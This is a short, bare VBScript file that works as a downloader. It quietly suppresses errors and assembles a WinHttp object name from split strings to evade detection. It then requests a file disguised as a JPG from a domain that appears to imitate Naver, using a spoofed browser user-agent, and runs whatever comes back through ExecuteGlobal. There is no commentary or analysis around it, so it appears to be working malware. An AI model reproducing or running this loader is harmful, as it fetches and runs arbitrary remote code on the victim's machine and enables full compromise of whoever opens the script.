'//////////////////////////////////////////////////////////
'//////////////////////////////////////////////////////////

'//////////////////////////////////////////////////////////
'//////////////////////////////////////////////////////////
On Error Resume Next
Const WinHttpRequestOption_SecureProtocols = 9
Const SecureProtocol_TLS1_2 = 2048  
Dim W_H_T, W_H_O
W_H_T = "WinHttp" & ".WinH" & "ttpRequest.5.1"
Set W_H_O = CreateObject(W_H_T)
W_H_O.Option(WinHttpRequestOption_SecureProtocols) = SecureProtocol_TLS1_2
W_H_O.SetTimeouts 5000, 5000, 5000, 5000
W_H_O.Open "POST", "https://thisisnaver.top/XX12.JPG", False
W_H_O.SetRequestHeader "User-Agent", _
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
W_H_O.Send
If W_H_O.Status = 200 Then
    ExecuteGlobal W_H_O.ResponseText
End If
'//////////////////////////////////////////////////////////
'//////////////////////////////////////////////////////////
'//////////////////////////////////////////////////////////
'//////////////////////////////////////////////////////////

'//////////////////////////////////////////////////////////
'//////////////////////////////////////////////////////////
